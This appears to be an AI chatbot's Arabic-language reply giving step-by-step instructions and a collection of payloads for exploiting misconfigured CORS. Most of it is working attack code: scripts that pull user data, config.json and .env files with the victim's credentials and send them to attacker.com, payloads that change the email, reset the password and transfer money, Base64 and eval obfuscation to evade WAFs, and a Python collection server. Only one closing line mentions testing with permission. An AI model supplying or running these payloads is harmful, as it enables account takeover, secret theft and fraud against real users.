
### الخطوات العملية لاستغلال إعدادات CORS الخاطئة
1. إعداد البيئة:
   - استخدم متصفحًا مع أداة وكيل مثل Burp Suite أو OWASP ZAP لفحص رؤوس الطلبات والاستجابات.
   - أعد خادمًا خارجيًا (مثل Python http.server أو ngrok) لتسجيل البيانات المستلمة.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة الطلبات في علامة Network ووحدة التحكم (Console).
   - أنشئ صفحة ويب ضارة على نطاق تحت سيطرتك أو خادم محلي للاختبار.

2. تحديد نقاط الضعف في CORS:
   - أرسل طلبات إلى نقاط النهاية (مثل /api/user أو /profile) باستخدام curl أو Burp Suite.
   - تحقق من رؤوس الاستجابة:
     - Access-Control-Allow-Origin: * (يسمح لجميع النطاقات).
     - Access-Control-Allow-Origin: http://attacker.com (يسمح بنطاق يمكن تزييفه).
     - Access-Control-Allow-Credentials: true (يسمح بإرسال بيانات الجلسة).
   - حدد نقاط نهاية تُرجع بيانات حساسة أو تدعم إجراءات (مثل POST أو DELETE).

3. إنشاء صفحة ويب ضارة:
   - أنشئ صفحة HTML تحتوي على شيفرة JavaScript، مثل:
     <script>
       fetch('https://example.com/api/user', {credentials: 'include'})
         .then(response => response.json())
         .then(data => fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(data)}));
     </script>
   - استضف الصفحة على خادمك (مثل http://attacker.com) أو اختبرها محليًا باستخدام python -m http.server.
   - تأكد من إرسال البيانات المستخرجة إلى خادمك الخارجي.

4. اختبار الطلبات:
   - افتح الصفحة الضارة في متصفح به جلسة نشطة للموقع المستهدف (مثل تسجيل دخول في https://example.com).
   - راقب طلبات الشبكة في أدوات المطورين للتأكد من:
     - إرسال الطلب إلى الموقع المستهدف.
     - إرجاع البيانات بسبب إعدادات CORS الضعيفة.
     - إرسال البيانات إلى خادمك.
   - تحقق من وجود أخطاء (مثل blocked by CORS policy) لتحديد القيود.

5. مراقبة الاستجابات:
   - تحقق من خادمك الخارجي لتأكيد استلام البيانات:
     - نجاح (True): تظهر البيانات (مثل بيانات المستخدم أو الرموز) في السجلات.
     - فشل (False): لا تصل بيانات بسبب حظر CORS أو عدم وجود جلسة.
   - استخدم Burp Suite لمراقبة الطلبات الصادرة والواردة.
   - حلل نوع البيانات المستخرجة (مثل JSON أو نصوص).

6. توسيع الهجوم (اختياري):
   - جرب نقاط نهاية أخرى (مثل /api/settings أو /api/transactions).
   - استخدم طلبات POST أو DELETE لتنفيذ إجراءات (مثل تغيير كلمة المرور).
   - استغل قوائم بيضاء ضعيفة بتزييف رأس Origin.
   - استخدم تقنيات إخفاء (مثل navigator.sendBeacon) لتجنب الكشف.

### جميع المحاولات الممكنة لاستغلال إعدادات CORS الخاطئة
سأقسم المحاولات إلى فئتين: المحاولات اليدوية (للاختبار اليدوي) والمحاولات الآلية (للاستخدام مع سكربتات).

#### 1. المحاولات اليدوية
تُستخدم لاختبار إعدادات CORS يدويًا عبر إنشاء صفحات ويب ضارة.

##### أ. استخراج بيانات حساسة عبر طلبات GET
استهداف نقاط نهاية تُرجع بيانات حساسة.
- الشيفرة:
  <script>
    fetch('https://example.com/api/user', {credentials: 'include'})
      .then(response => response.json())
      .then(data => fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(data)}));
  </script>
  - الإدخال: استضف الشيفرة على http://attacker.com.
  - كيف يعمل: يرسل طلب GET ويُرسل البيانات المستخرجة إلى خادم المهاجم.
  - متى يُستخدم؟: عند وجود بيانات حساسة ويسمح CORS بـ *.
- الشيفرة:
  <script>
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://example.com/api/profile');
    xhr.withCredentials = true;
    xhr.onload = () => fetch('http://attacker.com/log', {method: 'POST', body: xhr.responseText});
    xhr.send();
  </script>
  - الإدخال: أضف إلى صفحة HTML ضارة.
  - كيف يعمل: يستخدم XMLHttpRequest لإرسال الطلب.
  - متى يُستخدم؟: لتجاوز قيود fetch أو للمتصفحات القديمة.
- الشيفرة:
  <script>
    navigator.sendBeacon('http://attacker.com/log', JSON.stringify(
      await (await fetch('https://example.com/api/user', {credentials: 'include'})).json()
    ));
  </script>
  - الإدخال: استضف في صفحة ضارة.
  - كيف يعمل: يستخدم sendBeacon لإرسال البيانات بشكل غير متزامن.
  - متى يُستخدم؟: لتقليل الكشف.

##### ب. تنفيذ إجراءات عبر طلبات POST
استهداف نقاط نهاية تدعم إجراءات حساسة.
- الشيفرة:
  <script>
    fetch('https://example.com/api/settings', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'hacked@attacker.com'})
    }).then(response => fetch('http://attacker.com/log', {method: 'POST', body: response.status}));
  </script>
  - الإدخال: أضف إلى صفحة على http://attacker.com.
  - كيف يعمل: يغير البريد الإلكتروني ويسجل حالة الطلب.
  - متى يُستخدم؟: لتغيير إعدادات المستخدم.
- الشيفرة:
  <script>
    const formData = new FormData();
    formData.append('password', 'hacked123');
    fetch('https://example.com/api/reset-password', {
      method: 'POST',
      credentials: 'include',
      body: formData
    }).then(response => fetch('http://attacker.com/log', {method: 'POST', body: response.status}));
  </script>
  - الإدخال: استضف في صفحة ضارة.
  - كيف يعمل: يُعيد تعيين كلمة المرور باستخدام FormData.
  - متى يُستخدم؟: عند الحاجة إلى بيانات نموذج.
- الشيفرة:
  <script>
    fetch('https://example.com/api/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({amount: 1000, to: 'attacker_account'})
    }).then(response => fetch('http://attacker.com/log', {method: 'POST', body: response.status}));
  </script>
  - الإدخال: أضف إلى صفحة HTML.
  - كيف يعمل: يحاول تحويل أموال.
  - متى يُستخدم؟: لنقاط نهاية مالية.

##### ج. استغلال قوائم بيضاء ضعيفة
استهداف خوادم تقبل نطاقات بناءً على قوائم بيضاء غير آمنة.
- الشيفرة:
  <script>
    fetch('https://example.com/api/user', {
      credentials: 'include',
      headers: {'Origin': 'http://example.com.attacker.com'}
    })
      .then(response => response.json())
      .then(data => fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(data)}));
  </script>
  - الإدخال: استضف على نطاق مثل http://example.com.attacker.com.
  - كيف يعمل: يزيف Origin ليبدو جزءًا من قائمة بيضاء.
  - متى يُستخدم؟: عند استخدام regex غير دقيق.
- الشيفرة:
  <script>
    fetch('https://example.com/api/data', {
      credentials: 'include',
      headers: {'Origin': 'null'}
    })
      .then(response => response.json())
      .then(data => fetch('http://attacker.com/log', {method: 'POST', body: JSON.stringify(data)}));
  </script>
  - الإدخال: استضف في صفحة محلية (file://).
  - كيف يعمل: يستغل قبول Origin: null.
  - متى يُستخدم؟: عند السماح بقيم Origin غير قياسية.

##### د. استخراج ملفات عبر CORS
استهداف ملفات حساسة.
- الشيفرة:
  <script>
    fetch('https://example.com/config.json', {credentials: 'include'})
      .then(response => response.text())
      .then(data => fetch('http://attacker.com/log', {method: 'POST', body: data}));
  </script>
  - الإدخال: أضف إلى صفحة ضارة.
  - كيف يعمل: يصل إلى ملفات تكوين.
  - متى يُستخدم؟: عند توفر ملفات عامة.
- الشيفرة:
  <script>
    fetch('https://example.com/.env', {credentials: 'include'})
      .then(response => response.text())
      .then(data => fetch('http://attacker.com/log', {method: 'POST', body: data}));
  </script>
  - الإدخال: استضف في صفحة HTML.
  - كيف يعمل: يستهدف ملفات مثل .env.
  - متى يُستخدم؟: عند وجود ملفات حساسة.

##### هـ. محاولات مع التعتيم
تجنب اكتشاف أنظمة الأمان.
- الشيفرة:
  <script>
    fetch('https://example.com/api/user', {credentials: 'include'})
      .then(response => response.json())
      .then(data => fetch('http://attacker.com/log?c=' + btoa(JSON.stringify(data))));
  </script>
  - الإدخال: أضف إلى صفحة ضارة.
  - كيف يعمل: يُشفر البيانات بـ Base64.
  - متى يُستخدم؟: لتجنب WAF.
- الشيفرة:
  <script>
    eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhhbXBsZS5jb20vYXBpL3VzZXInLCB7Y3JlZGVudGlhbHM6ICdpbmNsdWRlJ30pLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nJywge21ldGhvZDogJ1BPU1QnLCBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKX0pKTs='));
  </script>
  - الإدخال: استضف في صفحة HTML.
  - كيف يعمل: يشفر الشيفرة بـ Base64 ويستخدم eval.
  - متى يُستخدم؟: لتجاوز أنظمة الكشف.

#### 2. المحاولات الآلية
تُستخدم مع سكربتات لأتمتة الاختبار.

##### أ. إعداد قائمة نقاط النهاية
- المحاولات:
  - إنشاء قائمة نقاط نهاية (مثل /api/user، /api/profile، /config.json).
  - مثال:
    https://example.com/api/user
    https://example.com/api/profile
    https://example.com/api/settings
    https://example.com/config.json
    https://example.com/.env
- كيف يعمل: اختبار كل نقطة نهاية باستخدام JavaScript.
- متى يُستخدم؟: لاختبار نقاط نهاية متعددة.

##### ب. سكربت أتمتة بسيط
- السكربت (Python مع خادم):
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          data = self.rfile.read(content_length).decode()
          print(f"بيانات مستلمة: {data}")

  endpoints = [
      'https://example.com/api/user',
      'https://example.com/api/profile',
      'https://example.com/api/settings',
      'https://example.com/config.json',
      'https://example.com/.env'
  ]

  html_template = """
  <script>
    fetch('{}', {{credentials: 'include'}})
      .then(response => response.text())
      .then(data => fetch('http://localhost:8000/log', {{method: 'POST', body: data}}));
  </script>
  """

  print("إنشاء صفحات اختبار:")
  for endpoint in endpoints:
      with open(f'test_{endpoint.replace("/", "_")}.html', 'w') as f:
          f.write(html_template.format(endpoint))
      print(f"تم إنشاء: test_{endpoint.replace('/', '_')}.html")

  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
- كيف يعمل: يُنشئ خادمًا وصفحات HTML لاختبار نقاط النهاية.
- متى يُستخدم؟: لأتمتة الاختبار.

##### ج. تحليل الاستجابات
- المحاولات:
  - قارن البيانات المستلمة (مثل بيانات المستخدم أو ملفات تكوين).
  - مثال: إذا تلقى الخادم {"username": "john"}، فهذا يؤكد نجاح الهجوم.
- كيف يعمل: تسجيل البيانات لتحديد النقاط الضعيفة.
- متى يُستخدم؟: لتحليل البيانات المستخرجة.

##### د. توسيع قائمة المحاولات
- المحاولات:
  - أضف طلبات POST/DELETE.
  - جرب رؤوس Origin مزيفة.
  - اختبر ملفات إضافية (مثل /secrets.txt).
- كيف يعمل: توسيع القائمة لتغطية شاملة.
- متى يُستخدم؟: لاستكشاف جميع الاحتمالات.

### نصائح إضافية
- إعداد الخادم: استخدم Python http.server أو ngrok.
- تجنب القيود: تحقق من رؤوس مثل Access-Control-Max-Age.
- التعتيم: استخدم Base64 أو إخفاء لتجنب WAF.
- اختبار النطاق: ابدأ بطلبات بسيطة لتأكيد إعدادات CORS.
- الأدوات: Burp Suite، OWASP ZAP، Selenium.
- السلامة: اختبر بإذن صريح فقط (مثل برامج مكافآت الأخطاء).

---

إذا كنت تريد أي تعديل (مثل تبسيط الشرح، التركيز على مثال معين، أو شرح موضوع آخر بنفس الأسلوب)، أخبرني وسأرد فورًا!